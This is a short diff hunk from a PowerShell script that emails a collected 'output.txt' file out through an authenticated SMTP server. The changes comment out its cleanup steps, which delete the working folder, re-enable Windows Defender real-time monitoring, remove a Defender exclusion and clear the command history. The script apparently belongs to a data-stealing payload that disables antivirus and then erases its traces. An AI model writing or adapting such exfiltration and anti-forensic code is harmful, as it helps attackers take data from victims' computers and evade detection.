@@ -113,12 +113,12 @@ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -Ar
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
 
 # Clean up
-Remove-Item -Path $dir -Recurse -Force
-Set-MpPreference -DisableRealtimeMonitoring $false
-Remove-MpPreference -ExclusionPath $dir
+#Remove-Item -Path $dir -Recurse -Force
+#Set-MpPreference -DisableRealtimeMonitoring $false
+#Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
-Clear-History
+#Clear-History
 
 # Reboot the system
 #Restart-Computer -Force
